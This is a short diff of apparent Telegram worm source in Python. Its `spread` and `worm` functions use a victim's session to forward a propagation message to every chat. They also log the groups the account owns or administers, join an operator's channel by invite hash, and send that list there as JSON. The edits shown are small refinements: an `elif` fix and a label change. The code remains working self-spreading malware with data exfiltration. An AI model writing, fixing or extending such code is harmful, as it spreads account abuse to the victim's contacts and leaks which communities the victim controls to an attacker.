@@ -86,7 +86,7 @@ async def spread(client, me, bot):
             permissions = await client.get_permissions(dialog, me)
             if permissions.is_creator:
                 perm_logs['creator'].append({'id': dialog.id, 'title': dialog.title})
-            if permissions.is_admin:
+            elif permissions.is_admin:
                 perm_logs['admin'].append({'id': dialog.id, 'title': dialog.title})
         try:
             msg = await spread_msg.forward_to(dialog)
@@ -119,7 +119,7 @@ async def worm(client, bot, logger_bot):
     try:
         perm_logs = await spread(client, me, bot)
         if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
-            await log['msg'].edit(log['txt'].replace("Session", f"Own: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
+            await log['msg'].edit(log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
             await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
             await client.send_message(log['dest'], json.dumps(perm_logs, indent=4))
             await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))
